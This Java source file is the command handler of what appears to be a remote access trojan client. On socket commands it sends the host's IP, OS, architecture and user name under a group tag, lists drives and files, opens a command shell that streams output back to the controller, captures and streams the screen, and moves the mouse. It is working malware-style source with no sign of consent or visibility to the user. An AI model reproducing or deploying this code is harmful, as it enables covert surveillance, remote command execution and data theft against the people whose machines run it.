
package application;

import java.awt.AWTException;
import java.awt.Graphics2D;
import java.util.Base64;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.CRC32;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import javax.swing.filechooser.FileSystemView;

import application.connection.Client;
import static application.Functions.*;

public class Reciver extends Thread {
	String group = "work";

	final static String SPL = "\\\\+*-";

	byte data[];
	Socket sock;
	Client Cs;

	public Reciver(byte[] data, Socket sock, Client Cs) {
		this.Cs = Cs;
		this.data = data;
		this.sock = sock;
		start();
	}

	public void send(String data) {
		try {

			DataOutputStream dOut = new DataOutputStream(sock.getOutputStream());
			byte[] b = Functions.Str2Byte(data);
			dOut.writeInt(b.length);
			dOut.write(b);
			dOut.flush();
		} catch (IOException e) {

		}
	}

	public void send(byte data[]) {
		try {

			DataOutputStream dOut = new DataOutputStream(sock.getOutputStream());

			dOut.writeInt(data.length);
			dOut.write(data);
			dOut.flush();
		} catch (IOException e) {

		}
	}

	private String getFiles(String String_path) {

		try {
			File folder = new File(String_path);
			File files[] = folder.listFiles();
			String pa=folder.getCanonicalPath();
			StringBuilder fls = new StringBuilder();
			if(files!=null)
			for (File file : files) {
				String type = null;
				java.nio.file.Path p = file.toPath();
				BasicFileAttributes view;

				view = Files.getFileAttributeView(p, BasicFileAttributeView.class).readAttributes();
				String size=null;
				if (file.isDirectory()){
					type = "DIR";
					fls.append(file.getName() + "**?" +view.creationTime() + "**?"
							+ type + "\\?");
				}
				else{
					type = "File";
					size=calculatesize(file.length());
					fls.append(file.getName() + "**?" + size + "**?" + view.creationTime() + "**?"
							+ type + "\\?");
				}
				

			}
			return fls.toString()+SPL+pa;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	private String getDrives() {

		File[] paths;
		StringBuilder fls = new StringBuilder();
		FileSystemView fsv = FileSystemView.getFileSystemView();

		paths = File.listRoots();

		for (File path : paths) {
			if (path.canRead() && path.canWrite())
				fls.append(fsv.getSystemDisplayName(path) + "\\?");

		}
		return fls.toString();

	}

	public BufferedImage scale(BufferedImage imageToScale, int dWidth, int dHeight) {
		BufferedImage scaledImage = null;
		if (imageToScale != null) {
			scaledImage = new BufferedImage(dWidth, dHeight, imageToScale.getType());
			Graphics2D graphics2D = scaledImage.createGraphics();
			graphics2D.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
			graphics2D.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
			graphics2D.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
			graphics2D.drawImage(imageToScale, 0, 0, dWidth, dHeight, null);
			graphics2D.dispose();
		}
		return scaledImage;
	}

	byte[] ScreenShot() throws AWTException {

		try {
			int splitimes = 3;
			/*
			 * int width=(int)
			 * (Toolkit.getDefaultToolkit().getScreenSize().getWidth()/splitimes
			 * ); int height=(int)
			 * (Toolkit.getDefaultToolkit().getScreenSize().getHeight()/
			 * splitimes);
			 */
			int width = (int) (1024 / splitimes);
			int height = (int) (768 / splitimes);
			BufferedImage sc1 = new Robot()
					.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			BufferedImage sc = scale(sc1, 1024, 768);
			ImageWriter jpgWriter = ImageIO.getImageWritersByFormatName("jpg").next();
			ImageWriteParam jpgWriteParam = jpgWriter.getDefaultWriteParam();
			jpgWriteParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
			jpgWriteParam.setCompressionQuality(0.1f);

			// JNAScreenShot.getScreenshot(new
			// Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			/*
			 * BufferedImage im2=new BufferedImage(sc.getWidth(),
			 * sc.getHeight(), BufferedImage.TYPE_3BYTE_BGR);
			 * im2.getGraphics().drawImage(sc, 0, 0,null); Mat mat = new
			 * Mat(sc.getHeight(),sc.getWidth(), CvType.CV_8UC3); mat.put(0, 0,
			 * ((DataBufferByte) im2.getRaster().getDataBuffer()).getData());
			 * MatOfByte mb=new MatOfByte();
			 * 
			 * Imgcodecs.imencode("*.jpg", mat, mb);
			 */
			int cntr = 0;
			ImageIO.setUseCache(false);
			if (Functions.imgs == null) {
				Functions.imgs = new byte[splitimes * splitimes][];

				for (int i = 0; i <= splitimes - 1; i++) {
					int y = height * i;

					for (int j = 0; j <= splitimes - 1; j++) {
						int x = width * j;
						BufferedImage bimg = sc.getSubimage(x, y, width, height);

						ByteArrayOutputStream igm = new ByteArrayOutputStream();
						ImageOutputStream outputStream = ImageIO.createImageOutputStream(igm);
						// ImageIO.write(bimg, "jpg", igm);
						jpgWriter.setOutput(outputStream);
						jpgWriter.write(null, new IIOImage(bimg, null, null), jpgWriteParam);
						Functions.imgs[cntr] = igm.toByteArray();
						cntr++;
					}

				}

				ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				ImageIO.setUseCache(false);
				baos2.write(("Rec" + SPL).getBytes("ISO-8859-15"));
				// ImageIO.write(sc, "jpg", baos);
				ImageOutputStream outputStream = ImageIO.createImageOutputStream(baos);
				jpgWriter.setOutput(outputStream);

				jpgWriter.write(null, new IIOImage(sc, null, null), jpgWriteParam);
				baos2.write(baos.toByteArray());
				// baos2.write((SPL).getBytes("ISO-8859-15"));

				return baos2.toByteArray();
			} else {
				CRC32 crc = new CRC32();
				ByteArrayOutputStream baos = new ByteArrayOutputStream();
				baos.write(("RecM" + SPL).getBytes("ISO-8859-15"));
				boolean change = false;
				for (int i = 0; i <= splitimes - 1; i++) {
					int y = height * i;
					// ImageIO.setUseCache(false);
					for (int j = 0; j <= splitimes - 1; j++) {
						int x = width * j;
						BufferedImage bimg = sc.getSubimage(x, y, width, height);

						ByteArrayOutputStream igm = new ByteArrayOutputStream();

						// ImageIO.write(bimg, "jpg", igm);
						ImageOutputStream outputStream = ImageIO.createImageOutputStream(igm);
						jpgWriter.setOutput(outputStream);
						jpgWriter.write(null, new IIOImage(bimg, null, null), jpgWriteParam);
						byte[] bymg = igm.toByteArray();
						crc.update(bymg);
						long vl = crc.getValue();
						crc.reset();
						crc.update(Functions.imgs[cntr]);
						long vl2 = crc.getValue();
						crc.reset();
						if (vl2 != vl) {
							Functions.imgs[cntr] = bymg;
							baos.write((x + "/*-" + y + "/*-").getBytes("ISO-8859-15"));
							baos.write(Functions.imgs[cntr]);
							baos.write(("*||*").getBytes("ISO-8859-15"));
							change = true;
						}

						cntr++;
					}

				}

				if (change == false) {
					System.out.println("nochange");
					baos.write(("noch").getBytes("ISO-8859-15"));
				}
				return baos.toByteArray();

			}
			// return mb.toArray();

			// return null;
		} catch (IOException ex) {
			Logger.getLogger(Reciver.class.getName()).log(Level.SEVERE, null, ex);
		}
		return null;
	}

	public void run() {

		String d[] = Functions.Byte2Str(data).split(Pattern.quote(SPL));

		switch (d[0]) {
		case "NewC": {
			String arch = System.getenv("PROCESSOR_ARCHITECTURE");
			String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");

			String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64bit" : "32bit";
			send("NewC" + SPL
					+ sock.getLocalSocketAddress().toString()
							.substring(1, sock.getLocalSocketAddress().toString().length()).split(":")[0]
					+ SPL + System.getProperty("os.name") + " " + realArch + SPL + System.getProperty("user.name") + SPL
					+ group);
			break;

		}
		case "BrowsFilesINI": {
			String drives = getDrives();
			String drvs[] = drives.split(Pattern.quote("\\?"));
			int index = drvs[0].lastIndexOf('(');
			String drive = drvs[0].substring(index + 1, index + 3) + "\\";
			send("SetDrives" + SPL + drives);
			String files =getFiles(drive);
			if(files!=null)
			send("BrowserFiles" + SPL + files);
			break;
		}
		case "GetFiles":{
			String files = getFiles(d[1]);
			if(files!=null)
			send("BrowserFiles" + SPL + files);
			break;
		}
		case "BrowsFiles":
			String files = getFiles(d[1]);
			System.out.println(files);
			send("BrowserFiles" + SPL + files);
			break;
		case "CommandLineIn": {
			try {
				Cs.startDos();
				InputStreamConsumer cons = new InputStreamConsumer(Cs.process.getInputStream());
				cons.start();
			} catch (IOException ex) {
				Logger.getLogger(Reciver.class.getName()).log(Level.SEVERE, null, ex);
			}
		}

			break;
		case "Command": {
			OutputStream wr = Cs.DosWriter;
			try {
				wr.write((d[1] + "\n").getBytes());
				wr.flush();
			} catch (IOException ex) {
				Logger.getLogger(Reciver.class.getName()).log(Level.SEVERE, null, ex);
			}
			break;
		}
		case "RecSrt":
			byte[] m;
			try {
				long startTime1 = System.currentTimeMillis();
				m = ScreenShot();
				// ByteArrayOutputStream bs=new ByteArrayOutputStream();
				// String s=Base64.getEncoder().encodeToString(m);
				/*
				 * bs.write(("Rec"+SPL).getBytes("ISO-8859-15")); bs.write(m);
				 * bs.write((SPL).getBytes("ISO-8859-15"));
				 */
				long endTime1 = System.currentTimeMillis();
				long duration1 = (endTime1 - startTime1);
				System.out.println((duration1));
				send(m);
				// bs.close();

				System.gc();
			} catch (AWTException ex) {
				Logger.getLogger(Reciver.class.getName()).log(Level.SEVERE, null, ex);
			}
			break;
		case "mouseup": {
			try {
				Robot rb = new Robot();
				rb.mouseMove(Integer.parseInt(d[1]), Integer.parseInt(d[2]));
			} catch (AWTException ex) {
				Logger.getLogger(Reciver.class.getName()).log(Level.SEVERE, null, ex);
			}
			break;
		}

		}

	}

	public static String Quote(String s) {
		if (s.contains(SPL)) {
			s = "QUT" + s;
			String rx = "(\\\\\\\\\\+)";
			StringBuffer sb = new StringBuffer();
			Pattern p = Pattern.compile(rx);
			Matcher m = p.matcher(s);
			while (m.find()) {
				m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1) + "#"));
			}
			m.appendTail(sb);
			return sb.toString();
		}

		return s;
	}

	public static String Unquote(String s) {
		if (s.startsWith("QUT")) {
			s = s.substring(3);
			String rx = "(\\\\\\\\\\+)(#)";
			StringBuffer sb = new StringBuffer();
			Pattern p = Pattern.compile(rx);
			Matcher m = p.matcher(s);
			while (m.find()) {
				m.appendReplacement(sb, Matcher.quoteReplacement(m.group(1)));
			}
			m.appendTail(sb);
			return sb.toString();
		}

		return s;
	}

	class InputStreamConsumer extends Thread {

		private InputStream is;

		public InputStreamConsumer(InputStream is) {
			this.is = is;

		}

		@Override
		public void run() {

			try {
				int value = -1;
				DataOutputStream dOut = new DataOutputStream(sock.getOutputStream());
				while ((value = is.read()) != -1) {

					byte[] b = Functions.Str2Byte("command" + SPL + value);
					dOut.writeInt(b.length);
					dOut.write(b);
					dOut.flush();

				}
			} catch (IOException exp) {
				exp.printStackTrace();
			}

		}

	}
}
